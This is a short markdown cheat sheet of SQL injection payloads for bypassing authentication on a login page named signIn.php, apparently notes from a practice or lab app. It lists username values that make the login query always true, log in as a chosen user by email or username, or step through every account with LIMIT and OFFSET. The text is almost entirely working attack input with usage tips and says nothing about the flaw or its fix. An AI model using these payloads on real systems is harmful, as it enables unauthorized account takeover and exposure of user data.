- Auth Bypass on signIn.php

  1. username => 'or '1'='1' -- '
  2. You can use this attack to get the first user, if you do not any username prior to your attempt.

- Auth Bypass with any field that may be publicly available

  1. username => 'or email='smb@gmail.com' -- '

- Auth Bypass with any skipping through
  1. username => 'or '1'='1' LIMIT 1 OFFSET 2 -- '
  2. OFFSET is the key value here. This way, you can go through the whole table.

* Auth a specific user by a known unique field
  username => 'or username='smb' -- '
  or
  username => 'or email='smb@gmail.com' -- '
